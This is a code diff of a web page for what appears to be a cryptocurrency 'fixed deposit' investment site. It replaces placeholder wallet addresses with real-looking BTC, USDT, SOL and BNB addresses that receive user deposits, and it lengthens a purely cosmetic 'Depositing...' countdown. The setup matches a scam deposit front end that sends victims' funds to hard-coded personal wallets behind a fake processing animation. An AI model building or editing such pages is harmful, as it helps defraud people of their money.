@@ -218,7 +218,7 @@ canvas{
 <!-- ================= DEPOSIT ================= -->
 <div class="balance-card">
   <h3>Deposit (Advanced Fixed Deposit Security)</h3>
-  <h4>Fixed Capital:$500</h4>
+  <h4>Fixed Capital:$00.00</h4>
   <button class="btn-yellow" onclick="openDeposit()">Make Deposit</button>
 </div>
 
@@ -272,11 +272,11 @@ canvas{
 <script>
 // ================= WALLET =================
 let wallets = {
- "USDT-ERC20":"0xA7f9C12D4E5F678901234567890ABCDEF1234567",
- "USDT-TRC20":"TXYz123456789ABCDEFGHJKLMNPQRST",
- "SOL":"9xQeWvG816bUx9EPfC9w8PqgkF5abcXYZ1234567",
- "BTC":"bc1qxy2kgdygjrsqtz2n0yrf2493p83kkfjhx0wlh",
- "BNB":"bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2"
+ "USDT-ERC20":"0xe5bc64a8ecb7e9be8161010959d20570968add91",
+ "USDT-TRC20":"TY3GGqzDi9sSivC8Y9WnsKS8KYVa599WkE",
+ "SOL":"E9iGT7beby9DEsGxPM3t4xJMjDKkR6fTuHriwjH3uUKy",
+ "BTC":"15GJLYrc7j2ywhWuQEH1JdDK4UGrprnrLG",
+ "BNB":"0xe5bc64a8ecb7e9be8161010959d20570968add91"
 };
 function openDeposit(){ 
   document.getElementById("depositPopup").style.display="flex"; 
@@ -393,20 +393,20 @@ animate();
 function resetProgressBar(){
   const bar=document.getElementById("depositProgressBar");
   bar.style.width="0%";
-  bar.textContent="10s";
+  bar.textContent="360s";
 }
 function confirmDeposit(){
   let amount=parseFloat(document.getElementById("depositAmount").value);
   if(!amount||amount<=0) return;
   
   const bar=document.getElementById("depositProgressBar");
-  let countdown=10;
+  let countdown=360;
   bar.style.width="0%";
   bar.textContent=`${countdown}s`;
   
   const interval = setInterval(()=>{
     countdown--;
-    bar.style.width = ((10-countdown)/10*100)+"%";
+    bar.style.width = ((360-countdown)/360*100)+"%";
     bar.textContent = countdown>0? `${countdown}s` : "Depositing...";
     if(countdown<=0){
       clearInterval(interval);
